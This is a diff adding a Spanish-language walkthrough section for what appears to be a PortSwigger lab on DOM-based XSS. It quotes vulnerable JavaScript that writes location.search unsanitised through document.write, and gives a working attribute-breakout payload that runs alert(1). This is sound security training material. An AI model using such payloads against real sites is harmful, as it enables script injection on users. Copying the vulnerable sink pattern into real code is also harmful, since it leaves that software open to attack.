@@ -578,5 +578,37 @@ Luego vamos al Exploit Server, y enviamos el siguiente payload.
 
 ## 21. Lab: DOM XSS in document.write sink using source location.search
 
+```
+This lab contains a DOM-based cross-site scripting vulnerability in the search query tracking functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search, which you can control using the website URL.
 
+To solve this lab, perform a cross-site scripting attack that calls the alert function.
+```
+
+Buscamos cualquier texto por ejemplo **aaa** en el laboratorio y luego revisamos si encontramos alguna coincidencia en el codigo fuente. Vemos que solo tenemos una coincidencia pero luego encontramos un codigo **HTML** interesante.
+
+```
+<script>
+    function trackSearch(query) {
+    	document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
+    }
+    var query = (new URLSearchParams(window.location.search)).get('search');
+    if(query) {
+    	trackSearch(query);
+    }
+</script>
+```
+
+Por ello si analizamos el mismo string pero mediante el codigo fuente de **inspecionar elemento** nos encontramos con otra coincidencia mas.
+
+![](img49.png)
+
+Entonces generamos el siguiente payload para ejecutar el alert.
+
+```
+"><script>alert(1)</script>
+```
+
+![](img50.png)
+
+## 22. Lab: DOM XSS in document.write sink using source location.search inside a select element
 
